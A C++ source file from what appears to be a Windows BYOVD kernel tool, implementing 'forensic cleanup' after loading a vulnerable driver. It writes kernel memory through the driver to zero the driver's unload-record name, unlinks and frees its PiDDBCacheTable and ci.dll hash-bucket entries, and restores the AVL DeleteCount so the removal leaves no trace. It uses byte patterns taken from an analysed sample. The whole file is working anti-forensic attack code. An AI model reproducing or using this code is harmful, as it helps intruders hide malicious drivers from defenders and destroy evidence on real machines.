#include "forensic_cleanup.h"

#include "ioctl.h"
#include "kern_scan.h"
#include "ntapi.h"
#include "pagewalk.h"
#include "syscall_hijack.h"

#include <cstdio>
#include <cstring>
#include <cwchar>
#include <vector>

namespace {

// Kernel-VA read that hops page boundaries via pagewalk + physmem.
bool read_kva(HANDLE dev, uint64_t cr3, uint64_t kva, void* dst, size_t size) {
    uint8_t* out = static_cast<uint8_t*>(dst);
    while (size) {
        uint64_t page_off = kva & 0xFFFULL;
        size_t   chunk    = (size < (0x1000 - page_off)) ? size : (0x1000 - page_off);
        uint64_t phys     = 0;
        if (!pagewalk::va_to_phys(dev, cr3, kva, phys)) return false;
        if (!ioctl::read_physical(dev, phys, out, chunk)) return false;
        kva  += chunk;
        out  += chunk;
        size -= chunk;
    }
    return true;
}

bool write_kva(HANDLE dev, uint64_t cr3, uint64_t kva, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        uint64_t page_off = kva & 0xFFFULL;
        size_t   chunk    = (size < (0x1000 - page_off)) ? size : (0x1000 - page_off);
        uint64_t phys     = 0;
        if (!pagewalk::va_to_phys(dev, cr3, kva, phys)) return false;
        if (!ioctl::write_physical(dev, phys, in, chunk)) return false;
        kva  += chunk;
        in   += chunk;
        size -= chunk;
    }
    return true;
}

// Grow-until-fits loop for NtQuerySystemInformation(SystemExtendedHandleInformation).
// Starts at 1 MB; doubles on STATUS_INFO_LENGTH_MISMATCH. System handle tables
// are typically 200-500 KB, so 1 MB lands on the first try most of the time.
bool enum_system_handles(std::vector<uint8_t>& buf) {
    ULONG size = 0x100000;
    for (int tries = 0; tries < 10; ++tries) {
        buf.resize(size);
        ULONG returned = 0;
        NTSTATUS st = ntapi::NtQuerySystemInformation(
            ntapi::SystemExtendedHandleInformation,
            buf.data(), size, &returned);
        if (NT_SUCCESS(st)) {
            buf.resize(returned);
            return true;
        }
        if (st != STATUS_INFO_LENGTH_MISMATCH) {
            std::printf("[!] NtQuerySystemInformation failed 0x%08lX\n",
                        static_cast<unsigned long>(st));
            return false;
        }
        size *= 2;
    }
    return false;
}

} // namespace

namespace forensic_cleanup {

bool prezero_driver_object_name(HANDLE dev, uint64_t cr3, HANDLE byovd_handle) {
    std::vector<uint8_t> buf;
    if (!enum_system_handles(buf)) return false;

    const auto* info =
        reinterpret_cast<const SYSTEM_HANDLE_INFORMATION_EX*>(buf.data());

    const ULONG_PTR our_pid    = static_cast<ULONG_PTR>(GetCurrentProcessId());
    const ULONG_PTR our_handle = reinterpret_cast<ULONG_PTR>(byovd_handle);

    uint64_t file_obj = 0;
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i) {
        const auto& e = info->Handles[i];
        if (e.UniqueProcessId == our_pid && e.HandleValue == our_handle) {
            file_obj = reinterpret_cast<uint64_t>(e.Object);
            break;
        }
    }
    if (!file_obj) {
        std::printf("[!] prezero: own handle %p not found in system handle table\n",
                    byovd_handle);
        return false;
    }

    uint64_t dev_obj = 0;
    uint64_t drv_obj = 0;
    uint64_t ldr_ent = 0;

    if (!read_kva(dev, cr3, file_obj + 0x08, &dev_obj, 8) ||
        !read_kva(dev, cr3, dev_obj  + 0x08, &drv_obj, 8) ||
        !read_kva(dev, cr3, drv_obj  + 0x28, &ldr_ent, 8)) {
        std::printf("[!] prezero: chain walk failed\n");
        return false;
    }

    const uint64_t ustr_va = ldr_ent + 0x58;   // KLDR.BaseDllName

    uint16_t old_length = 0;
    uint64_t name_buf   = 0;
    if (!read_kva(dev, cr3, ustr_va + 0, &old_length, 2) ||
        !read_kva(dev, cr3, ustr_va + 8, &name_buf, 8)) {
        std::printf("[!] prezero: UNICODE_STRING read failed\n");
        return false;
    }

    std::printf("[*] prezero: FILE=%016llX DEV=%016llX DRV=%016llX LDR=%016llX\n",
                (unsigned long long)file_obj, (unsigned long long)dev_obj,
                (unsigned long long)drv_obj,  (unsigned long long)ldr_ent);

    // Optional human-readable confirmation of the name we're about to nuke.
    if (old_length && name_buf) {
        wchar_t preview[64] = {};
        size_t  ncopy = old_length;
        if (ncopy > sizeof(preview) - sizeof(wchar_t)) {
            ncopy = sizeof(preview) - sizeof(wchar_t);
        }
        if (read_kva(dev, cr3, name_buf, preview, ncopy)) {
            std::wprintf(L"[*] prezero: BaseDllName = \"%ls\" (Length=%u)\n",
                         preview, old_length);
        }
    }

    const uint16_t zero = 0;
    if (!write_kva(dev, cr3, ustr_va + 0, &zero, 2)) {
        std::printf("[!] prezero: Length write failed\n");
        return false;
    }

    uint16_t verify = 0xFFFF;
    if (!read_kva(dev, cr3, ustr_va + 0, &verify, 2) || verify != 0) {
        std::printf("[!] prezero: verify read-back got 0x%04X\n", verify);
        return false;
    }

    std::printf("[+] prezero: BaseDllName.Length %u -> 0 (MiRememberUnloadedDriver "
                "will early-return on unload)\n", old_length);
    return true;
}

// ============================================================================
// Phase 13.1: PiDDBCacheTable / PiDDBCacheList scrub.
// ============================================================================

namespace {

// Pattern cascade structure. Each variant has its own bytes/mask/length plus
// the offset at which the target RIP-rel LEA begins within the matched bytes.
struct PatternVariant {
    const uint8_t* bytes;
    const uint8_t* mask;
    size_t         len;
    size_t         lea_offset;   // match start -> LEA opcode start
    const char*    label;
};

// =========================================================================
// PiDDBLock cascades — decrypted from sample's sub_7FFAB78A7580.
// =========================================================================

// PRIMARY (sample's first attempt, 44 bytes, LEA at match+28).
// test+jns, gs-read KTHREAD, dec KernelApcDisable, mov dl,1,
// lea rcx,[rip+PiDDBLock], call ExAcquire..., mov r?,[rsp+??].
// Uses mov ebx, eax (8B D8) — fragile to register-allocator changes.
static const uint8_t PL_PAT_P[] = {
    0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0,0,0,0,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0,0,0,0,
    0x66, 0xFF, 0x88, 0,0,0,0,
    0xB2, 0x01, 0x48, 0x8D, 0x0D, 0,0,0,0,
    0xE8, 0,0,0,0,
    0x4C, 0x8B, 0, 0x24
};
static const uint8_t PL_MASK_P[] = {
    1,1,1,1,1,1, 0,0,0,0,
    1,1,1,1,1, 0,0,0,0,
    1,1,1, 0,0,0,0,
    1,1,1,1,1, 0,0,0,0,
    1, 0,0,0,0,
    1,1, 0, 1
};

// FALLBACK 1 (29 bytes, LEA at match+16). Best-designed of the three:
// no register-allocator dependencies, all bytes anchored on opcodes or
// RIP-rel wildcards.
// mov rcx,[rip+global]; test rcx,rcx; jne rel32; lea rcx,[rip+PiDDBLock]; call; call
static const uint8_t PL_PAT_F1[] = {
    0x48, 0x8B, 0x0D, 0,0,0,0,
    0x48, 0x85, 0xC9,
    0x0F, 0x85, 0,0,0,0,
    0x48, 0x8D, 0x0D, 0,0,0,0,
    0xE8, 0,0,0,0,
    0xE8
};
static const uint8_t PL_MASK_F1[] = {
    1,1,1, 0,0,0,0,
    1,1,1,
    1,1, 0,0,0,0,
    1,1,1, 0,0,0,0,
    1, 0,0,0,0,
    1
};

// FALLBACK 2 (44 bytes, LEA at match+19). Same instructions as primary but
// compiler-reordered: LEA moved before the dec_word. Inherits primary's
// 8B D8 (mov ebx,eax) register dependency.
static const uint8_t PL_PAT_F2[] = {
    0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0,0,0,0,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0,0,0,0,
    0x48, 0x8D, 0x0D, 0,0,0,0,
    0xB2, 0x01,
    0x66, 0xFF, 0x88, 0,0,0,0,
    0x90, 0xE8, 0,0,0,0,
    0x4C, 0x8B, 0, 0x24
};
static const uint8_t PL_MASK_F2[] = {
    1,1,1,1,1,1, 0,0,0,0,
    1,1,1,1,1, 0,0,0,0,
    1,1,1, 0,0,0,0,
    1,1,
    1,1,1, 0,0,0,0,
    1,1, 0,0,0,0,
    1,1, 0, 1
};

static const PatternVariant PIDDB_LOCK_VARIANTS[] = {
    { PL_PAT_P,  PL_MASK_P,  sizeof(PL_PAT_P),  28, "primary"    },
    { PL_PAT_F1, PL_MASK_F1, sizeof(PL_PAT_F1), 16, "fallback-1" },
    { PL_PAT_F2, PL_MASK_F2, sizeof(PL_PAT_F2), 19, "fallback-2" },
};

// =========================================================================
// PiDDBCacheTable cascades.
// =========================================================================

// PRIMARY (6 bytes, LEA at match+3).
// add dx, dx; lea rcx, [rip+PiDDBCacheTable]
// Short; relies on "add dx,dx then lea rcx" being unique in PAGE.
static const uint8_t PT_PAT_P[]  = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
static const uint8_t PT_MASK_P[] = {    1,    1,    1,    1,    1,    1 };

// FALLBACK 1 (8 bytes, LEA at match+5).
// mov rdi, rcx; xor eax, eax; lea rcx, [rip+PiDDBCacheTable]
static const uint8_t PT_PAT_F1[]  = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
static const uint8_t PT_MASK_F1[] = {    1,    1,    1,    1,    1,    1,    1,    1 };

static const PatternVariant PIDDB_TABLE_VARIANTS[] = {
    { PT_PAT_P,  PT_MASK_P,  sizeof(PT_PAT_P),  3, "primary"    },
    { PT_PAT_F1, PT_MASK_F1, sizeof(PT_PAT_F1), 5, "fallback-1" },
};

// Walk the cascade, return first successful resolution. Returns 0 on total
// miss — caller aborts scrub (no kernel writes to wrong address).
// Verbose: prints per-variant miss reason so friend's log tells us which
// cascade to update for their build.
uint64_t resolve_piddb_global(HANDLE dev, uint64_t cr3, uint64_t ntoskrnl_base,
                              const char* sym_name,
                              const PatternVariant* variants, size_t n_variants) {
    for (size_t i = 0; i < n_variants; ++i) {
        const auto& v = variants[i];
        uint64_t match = kern_scan::scan_pattern_in_section(
            dev, cr3, ntoskrnl_base, "PAGE", v.bytes, v.mask, v.len);
        if (!match) {
            std::printf("    [-] %s/%s: pattern not found in PAGE (len=%zu, LEA@%zu)\n",
                        sym_name, v.label, v.len, v.lea_offset);
            continue;
        }
        uint64_t resolved = kern_scan::resolve_rel32_lea_target(
            dev, cr3, match + v.lea_offset, 0x48, 0x8D, 0x0D);
        if (!resolved) {
            std::printf("    [-] %s/%s: hit @ %016llX but LEA opcode mismatch at +%zu "
                        "(expected 48 8D 0D)\n",
                        sym_name, v.label,
                        (unsigned long long)match, v.lea_offset);
            continue;
        }
        std::printf("[+] %s: %s hit @ %016llX -> %016llX\n",
                    sym_name, v.label,
                    (unsigned long long)match,
                    (unsigned long long)resolved);
        return resolved;
    }
    std::printf("[!] %s: ALL %zu cascades missed — cannot resolve on this build, "
                "aborting scrub\n",
                sym_name, n_variants);
    std::printf("    send log + ntoskrnl.exe TimeDateStamp to developer so a "
                "build-specific cascade can be added\n");
    return 0;
}

// RTL_AVL_TABLE DeleteCount offset (x64 layout, IDA-verified 2026-04-17).
constexpr size_t AVL_DELETE_COUNT_OFFSET = 0x40;

// Offsets within a PiDDB cache entry (56-byte user data portion of AVL node).
constexpr size_t ENTRY_FLINK       = 0x00;
constexpr size_t ENTRY_BLINK       = 0x08;
constexpr size_t ENTRY_NAME_LENGTH = 0x10;
constexpr size_t ENTRY_NAME_MAXLEN = 0x12;
constexpr size_t ENTRY_NAME_BUFFER = 0x18;
constexpr size_t ENTRY_TIMESTAMP   = 0x20;

struct PiDDBExports {
    uint64_t ex_acquire_exclusive;
    uint64_t ex_release;
    uint64_t ex_free_pool_tag;
    uint64_t rtl_lookup_avl;
    uint64_t rtl_delete_avl;
};

bool resolve_piddb_exports(const syscall_hijack::Context& hij,
                           PiDDBExports& out) {
    struct Entry { const char* name; uint64_t* dst; };
    const Entry names[] = {
        { "ExAcquireResourceExclusiveLite",  &out.ex_acquire_exclusive },
        { "ExReleaseResourceLite",           &out.ex_release           },
        { "ExFreePoolWithTag",               &out.ex_free_pool_tag     },
        { "RtlLookupElementGenericTableAvl", &out.rtl_lookup_avl       },
        { "RtlDeleteElementGenericTableAvl", &out.rtl_delete_avl       },
    };
    for (const auto& e : names) {
        *e.dst = syscall_hijack::resolve_kernel_export(
            hij, hij.ntoskrnl_base_va, e.name);
        if (!*e.dst) {
            std::printf("[!] scrub_piddb: export %s not resolved\n", e.name);
            return false;
        }
    }
    return true;
}

} // namespace

bool allocate_scratch(const syscall_hijack::Context& hij,
                      uint64_t mm_alloc_va,
                      uint64_t size,
                      Scratch& out) {
    out = {};
    if (!mm_alloc_va || !size) return false;
    uint64_t va = 0;
    if (!syscall_hijack::invoke(hij, mm_alloc_va, size, 0, 0, 0, va) ||
        va < 0xFFFF800000000000ULL) {
        std::printf("[!] forensic scratch: alloc failed (got %016llX)\n",
                    (unsigned long long)va);
        return false;
    }
    out.va   = va;
    out.size = size;
    std::printf("[+] forensic scratch: %016llX (%llu bytes, persistent)\n",
                (unsigned long long)va, (unsigned long long)size);
    return true;
}

bool free_scratch(const syscall_hijack::Context& hij,
                  HANDLE dev, uint64_t cr3,
                  Scratch& scratch) {
    if (!scratch.size) return true;

    // Zero-wipe full page via physmem (removes any residual data — names,
    // timestamps, AVL comparator artifacts).
    std::vector<uint8_t> zero(scratch.size, 0);
    write_kva(dev, cr3, scratch.va, zero.data(), zero.size());

    uint64_t mm_free = syscall_hijack::resolve_kernel_export(
        hij, hij.ntoskrnl_base_va, "MmFreeIndependentPages");
    if (!mm_free) {
        mm_free = syscall_hijack::resolve_kernel_export(
            hij, hij.ntoskrnl_base_va, "MmFreeIndependentPagesEx");
    }
    bool freed = false;
    if (mm_free) {
        uint64_t rc = 0;
        freed = syscall_hijack::invoke(hij, mm_free,
                                       scratch.va, scratch.size, 0, 0, rc);
    }
    if (freed) {
        std::printf("[+] forensic scratch: %016llX wiped + freed\n",
                    (unsigned long long)scratch.va);
    } else {
        std::printf("[*] forensic scratch: %016llX wiped but not freed "
                    "(MmFreeIndependentPages unresolved or invoke failed)\n",
                    (unsigned long long)scratch.va);
    }
    scratch = {};
    return freed;
}

bool scrub_piddb_cache(const syscall_hijack::Context& hij,
                       HANDLE dev, uint64_t cr3,
                       uint64_t ntoskrnl_base,
                       const Scratch& scratch,
                       const wchar_t* byovd_basename,
                       uint32_t byovd_timestamp) {
    if (!scratch.size || scratch.size < 0x100) {
        std::printf("[!] scrub_piddb: scratch missing or undersized (need >=256B)\n");
        return false;
    }

    const size_t name_chars = std::wcslen(byovd_basename);
    if (name_chars == 0 || name_chars > 64) {
        std::printf("[!] scrub_piddb: unreasonable basename length %zu\n", name_chars);
        return false;
    }

    const uint64_t piddb_table_va = resolve_piddb_global(
        dev, cr3, ntoskrnl_base, "PiDDBCacheTable",
        PIDDB_TABLE_VARIANTS,
        sizeof(PIDDB_TABLE_VARIANTS) / sizeof(PIDDB_TABLE_VARIANTS[0]));
    const uint64_t piddb_lock_va  = resolve_piddb_global(
        dev, cr3, ntoskrnl_base, "PiDDBLock",
        PIDDB_LOCK_VARIANTS,
        sizeof(PIDDB_LOCK_VARIANTS) / sizeof(PIDDB_LOCK_VARIANTS[0]));
    if (!piddb_table_va || !piddb_lock_va) {
        std::printf("[!] scrub_piddb: refusing to proceed with unresolved VA "
                    "(table=%016llX lock=%016llX)\n",
                    (unsigned long long)piddb_table_va,
                    (unsigned long long)piddb_lock_va);
        return false;
    }
    const uint64_t scratch_va     = scratch.va;
    std::printf("[*] scrub_piddb: resolved table=%016llX lock=%016llX\n",
                (unsigned long long)piddb_table_va,
                (unsigned long long)piddb_lock_va);

    PiDDBExports exp{};
    if (!resolve_piddb_exports(hij, exp)) return false;

    // Stage the 56-byte search key + name wchars into the persistent scratch.
    // Layout: [0..0x37] = key struct; [0x38..] = wchar name buffer.
    uint8_t keybuf[0x38] = {};
    const uint16_t name_bytes = static_cast<uint16_t>(name_chars * sizeof(wchar_t));
    *reinterpret_cast<uint16_t*>(&keybuf[ENTRY_NAME_LENGTH]) = name_bytes;
    *reinterpret_cast<uint16_t*>(&keybuf[ENTRY_NAME_MAXLEN]) =
        static_cast<uint16_t>(name_bytes + sizeof(wchar_t));
    *reinterpret_cast<uint64_t*>(&keybuf[ENTRY_NAME_BUFFER]) = scratch_va + 0x38;
    *reinterpret_cast<uint32_t*>(&keybuf[ENTRY_TIMESTAMP])   = byovd_timestamp;

    if (!write_kva(dev, cr3, scratch_va, keybuf, sizeof(keybuf)) ||
        !write_kva(dev, cr3, scratch_va + 0x38, byovd_basename, name_bytes)) {
        std::printf("[!] scrub_piddb: scratch stage failed\n");
        return false;
    }

    // Acquire lock. No KeEnterCriticalRegion — it bugchecks through our
    // hijack primitive (see header comment). Sample skips it too.
    uint64_t rc = 0;
    if (!syscall_hijack::invoke(hij, exp.ex_acquire_exclusive,
                                piddb_lock_va, TRUE, 0, 0, rc)) {
        std::printf("[!] scrub_piddb: ExAcquireResourceExclusiveLite invoke failed\n");
        return false;
    }

    bool succeeded     = false;
    bool entry_present = false;

    do {
        // Lookup.
        uint64_t entry_va = 0;
        if (!syscall_hijack::invoke(hij, exp.rtl_lookup_avl,
                                    piddb_table_va, scratch_va, 0, 0, entry_va)) {
            std::printf("[!] scrub_piddb: RtlLookup invoke failed\n");
            break;
        }
        if (!entry_va) {
            // Not cached — treat as already-clean success (same as sample).
            succeeded = true;
            break;
        }
        entry_present = true;

        // Read neighbors + name-buffer pool pointer (under lock, stable).
        uint64_t flink = 0, blink = 0, name_pool = 0;
        if (!read_kva(dev, cr3, entry_va + ENTRY_FLINK,       &flink,     8) ||
            !read_kva(dev, cr3, entry_va + ENTRY_BLINK,       &blink,     8) ||
            !read_kva(dev, cr3, entry_va + ENTRY_NAME_BUFFER, &name_pool, 8)) {
            std::printf("[!] scrub_piddb: flink/blink/name-pool read failed\n");
            break;
        }

        // Manual LIST unlink: blink->Flink = flink, flink->Blink = blink.
        if (!write_kva(dev, cr3, blink + ENTRY_FLINK, &flink, 8) ||
            !write_kva(dev, cr3, flink + ENTRY_BLINK, &blink, 8)) {
            std::printf("[!] scrub_piddb: LIST unlink writes failed\n");
            break;
        }

        // AVL unlink via Rtl (also frees the AVL node's Rtl-wrapper allocation).
        uint64_t del_ret = 0;
        if (!syscall_hijack::invoke(hij, exp.rtl_delete_avl,
                                    piddb_table_va, entry_va, 0, 0, del_ret)) {
            std::printf("[!] scrub_piddb: RtlDelete invoke failed\n");
            break;
        }

        // Free the separately-allocated name-buffer pool. RtlDelete handles
        // the AVL node's wrapper allocation but NOT this one, which holds the
        // wchar_t[] for the driver basename. Sample leaves this as an orphan
        // pool allocation containing the BYOVD filename — writeup §3.13 gap.
        // tag=0 = wildcard free, matches what ntoskrnl does in its own eviction
        // path inside PiUpdateDriverDBCache.
        if (name_pool) {
            uint64_t free_rc = 0;
            if (!syscall_hijack::invoke(hij, exp.ex_free_pool_tag,
                                        name_pool, 0, 0, 0, free_rc)) {
                std::printf("[!] scrub_piddb: ExFreePoolWithTag invoke failed "
                            "(name-pool %016llX leaked)\n",
                            (unsigned long long)name_pool);
            }
        }

        // Erase Rtl's auto-increment of DeleteCount.
        const uint64_t dc_va = piddb_table_va + AVL_DELETE_COUNT_OFFSET;
        uint32_t dc = 0;
        if (read_kva(dev, cr3, dc_va, &dc, 4) && dc > 0) {
            dc--;
            if (!write_kva(dev, cr3, dc_va, &dc, 4)) {
                std::printf("[!] scrub_piddb: DeleteCount write-back failed\n");
                // non-fatal — Rtl delete already succeeded
            }
        }

        std::printf("[+] scrub_piddb: entry %016llX removed from AVL+LIST, "
                    "name-pool %016llX freed, DeleteCount restored\n",
                    (unsigned long long)entry_va,
                    (unsigned long long)name_pool);
        succeeded = true;
    } while (false);

    // Always release lock.
    syscall_hijack::invoke(hij, exp.ex_release, piddb_lock_va, 0, 0, 0, rc);

    // Scratch is caller-owned (persistent); don't wipe/free here. Final
    // wipe+free happens once at end-of-session via free_scratch().

    if (!entry_present) {
        std::printf("[*] scrub_piddb: BYOVD not cached (clean already)\n");
    }
    return succeeded;
}

// ============================================================================
// Phase 13.2: ci.dll g_KernelHashBucketList scrub.
// ============================================================================

namespace {

// Entry offsets (singly-linked list, Flink-only).
constexpr size_t CI_ENTRY_FLINK       = 0x00;
constexpr size_t CI_ENTRY_NAME_LENGTH = 0x08;
constexpr size_t CI_ENTRY_NAME_BUFFER = 0x10;

// HEAD pattern (16 bytes, decrypted from sample's sub_7FFAB78A68D0).
// mov rbx, [rip+g_KernelHashBucketList]; jmp short rel8;
// test dword [rbx+0x40], 0x2000
// MOV rel32 at match+3, instr len 7.
static const uint8_t CI_HEAD_PAT[] = {
    0x48, 0x8B, 0x1D, 0,0,0,0,
    0xEB, 0,
    0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00
};
static const uint8_t CI_HEAD_MASK[] = {
    1,1,1, 0,0,0,0,
    1, 0,
    1,1,1,1,1,1,1
};

// LOCK pattern (3 bytes, backward-scan 30B before head-match).
// lea rcx, [rip+g_HashCacheLock] — no surrounding context.
static const uint8_t CI_LOCK_PAT[]  = { 0x48, 0x8D, 0x0D };
static const uint8_t CI_LOCK_MASK[] = { 1, 1, 1 };

// Resolves ci.dll's g_KernelHashBucketList + g_HashCacheLock VAs via pattern
// scan. Returns false on any miss — caller aborts scrub (no hardcoded fallback).
bool resolve_ci_globals(HANDLE dev, uint64_t cr3, uint64_t ci_base,
                        uint64_t& head_va, uint64_t& lock_va) {
    uint64_t head_match = kern_scan::scan_pattern_in_section(
        dev, cr3, ci_base, "PAGE",
        CI_HEAD_PAT, CI_HEAD_MASK, sizeof(CI_HEAD_PAT));
    if (!head_match) {
        std::printf("[!] ci: HEAD pattern miss in PAGE (pattern: 48 8B 1D ?? ?? ?? ?? "
                    "EB ?? F7 43 40 00 20 00 00)\n");
        std::printf("    ci.dll base=%016llX — send log + ci.dll version to developer\n",
                    (unsigned long long)ci_base);
        return false;
    }

    head_va = kern_scan::resolve_rel32_lea_target(
        dev, cr3, head_match, 0x48, 0x8B, 0x1D);
    if (!head_va) {
        std::printf("[!] ci: HEAD MOV rel32 resolve failed at match %016llX "
                    "(expected opcode 48 8B 1D at +0)\n",
                    (unsigned long long)head_match);
        return false;
    }

    uint64_t lock_match = kern_scan::scan_pattern_backward(
        dev, cr3, head_match - 30, head_match,
        CI_LOCK_PAT, CI_LOCK_MASK, sizeof(CI_LOCK_PAT));
    if (!lock_match) {
        std::printf("[!] ci: LOCK backward-scan miss in 30B window before HEAD@%016llX "
                    "(no 48 8D 0D found)\n",
                    (unsigned long long)head_match);
        std::printf("    likely cause: compiler reordered code so LEA is farther than "
                    "30B from HEAD — widen window or add explicit pattern\n");
        return false;
    }

    lock_va = kern_scan::resolve_rel32_lea_target(
        dev, cr3, lock_match, 0x48, 0x8D, 0x0D);
    if (!lock_va) {
        std::printf("[!] ci: LOCK LEA rel32 resolve failed at match %016llX\n",
                    (unsigned long long)lock_match);
        return false;
    }

    std::printf("[+] ci: head=%016llX lock=%016llX via pattern "
                "(head-match @ %016llX, lock-match @ %016llX)\n",
                (unsigned long long)head_va, (unsigned long long)lock_va,
                (unsigned long long)head_match, (unsigned long long)lock_match);
    return true;
}

} // namespace

bool scrub_kernel_hash_bucket(const syscall_hijack::Context& hij,
                              HANDLE dev, uint64_t cr3,
                              const wchar_t* byovd_basename) {
    const size_t name_chars = std::wcslen(byovd_basename);
    if (name_chars == 0 || name_chars > 64) {
        std::printf("[!] scrub_kerhash: unreasonable basename length %zu\n", name_chars);
        return false;
    }
    const uint16_t expected_name_bytes =
        static_cast<uint16_t>(name_chars * sizeof(wchar_t));

    uint64_t ci_base = kern_scan::resolve_loaded_driver_base("ci.dll");
    if (!ci_base) {
        std::printf("[!] scrub_kerhash: ci.dll base not resolved\n");
        return false;
    }
    std::printf("[*] scrub_kerhash: ci.dll base %016llX\n",
                (unsigned long long)ci_base);

    uint64_t head_ptr_va = 0, lock_va = 0;
    if (!resolve_ci_globals(dev, cr3, ci_base, head_ptr_va, lock_va)) {
        return false;
    }

    const uint64_t ex_acq = syscall_hijack::resolve_kernel_export(
        hij, hij.ntoskrnl_base_va, "ExAcquireResourceExclusiveLite");
    const uint64_t ex_rel = syscall_hijack::resolve_kernel_export(
        hij, hij.ntoskrnl_base_va, "ExReleaseResourceLite");
    const uint64_t ex_free = syscall_hijack::resolve_kernel_export(
        hij, hij.ntoskrnl_base_va, "ExFreePoolWithTag");
    if (!ex_acq || !ex_rel || !ex_free) {
        std::printf("[!] scrub_kerhash: export resolve failed "
                    "(acq=%p rel=%p free=%p)\n",
                    (void*)ex_acq, (void*)ex_rel, (void*)ex_free);
        return false;
    }

    // Acquire g_HashCacheLock exclusive.
    uint64_t rc = 0;
    if (!syscall_hijack::invoke(hij, ex_acq, lock_va, TRUE, 0, 0, rc)) {
        std::printf("[!] scrub_kerhash: ExAcquire invoke failed\n");
        return false;
    }

    bool succeeded   = false;
    bool entry_found = false;
    int  walked      = 0;

    do {
        // Walk: prev_slot holds the QWORD pointing to curr. For head: it's
        // the ci.dll global's VA. For subsequent entries: it's curr->Flink
        // slot at entry+0.
        uint64_t prev_slot = head_ptr_va;
        uint64_t cur_entry = 0;
        if (!read_kva(dev, cr3, prev_slot, &cur_entry, 8)) {
            std::printf("[!] scrub_kerhash: head read failed\n");
            break;
        }

        while (cur_entry && walked < 1024) {
            ++walked;

            uint16_t name_len = 0;
            if (!read_kva(dev, cr3, cur_entry + CI_ENTRY_NAME_LENGTH,
                          &name_len, 2)) {
                std::printf("[!] scrub_kerhash: length read failed @ %016llX\n",
                            (unsigned long long)cur_entry);
                break;
            }

            // Loose length prefilter: entries storing a path containing the
            // basename must be at least basename-bytes long. Rejects anything
            // shorter (e.g. truncated entries) without reading buffer.
            // ci.dll stores paths like "\Users\<user>\AppData\Local\Temp\XXXXXX"
            // (partial, no drive letter), so a wcsstr substring search is
            // needed — exact-length wcsncmp misses everything.
            bool name_matches = false;
            uint64_t name_buf = 0;
            if (name_len >= expected_name_bytes &&
                name_len <= 1024 &&
                read_kva(dev, cr3, cur_entry + CI_ENTRY_NAME_BUFFER,
                         &name_buf, 8) && name_buf) {
                wchar_t cur_name[520] = {};
                size_t bytes_to_read = name_len;
                if (bytes_to_read > sizeof(cur_name) - sizeof(wchar_t)) {
                    bytes_to_read = sizeof(cur_name) - sizeof(wchar_t);
                }
                if (read_kva(dev, cr3, name_buf, cur_name, bytes_to_read)) {
                    cur_name[bytes_to_read / sizeof(wchar_t)] = 0;
                    if (std::wcsstr(cur_name, byovd_basename) != nullptr) {
                        name_matches = true;
                    }
                }
            }

            if (name_matches) {
                entry_found = true;

                // Read curr->Flink, patch prev_slot = next, free entry.
                uint64_t next_entry = 0;
                if (!read_kva(dev, cr3, cur_entry + CI_ENTRY_FLINK,
                              &next_entry, 8) ||
                    !write_kva(dev, cr3, prev_slot, &next_entry, 8)) {
                    std::printf("[!] scrub_kerhash: unlink failed @ %016llX\n",
                                (unsigned long long)cur_entry);
                    break;
                }

                uint64_t free_rc = 0;
                if (!syscall_hijack::invoke(hij, ex_free,
                                            cur_entry, 0, 0, 0, free_rc)) {
                    std::printf("[!] scrub_kerhash: ExFreePoolWithTag failed "
                                "(%016llX unlinked but leaked)\n",
                                (unsigned long long)cur_entry);
                }

                std::printf("[+] scrub_kerhash: entry %016llX (name='%.*ls') "
                            "unlinked + freed\n",
                            (unsigned long long)cur_entry,
                            static_cast<int>(name_chars), byovd_basename);
                succeeded = true;
                break;
            }

            // Advance — next iteration's prev_slot = curr's Flink slot.
            prev_slot = cur_entry + CI_ENTRY_FLINK;
            uint64_t next = 0;
            if (!read_kva(dev, cr3, cur_entry + CI_ENTRY_FLINK, &next, 8)) {
                break;
            }
            cur_entry = next;
        }

        if (!entry_found) {
            std::printf("[*] scrub_kerhash: BYOVD not cached "
                        "(walked %d, clean already)\n", walked);
            succeeded = true;
        }
    } while (false);

    // Release lock.
    syscall_hijack::invoke(hij, ex_rel, lock_va, 0, 0, 0, rc);

    return succeeded;
}

} // namespace forensic_cleanup
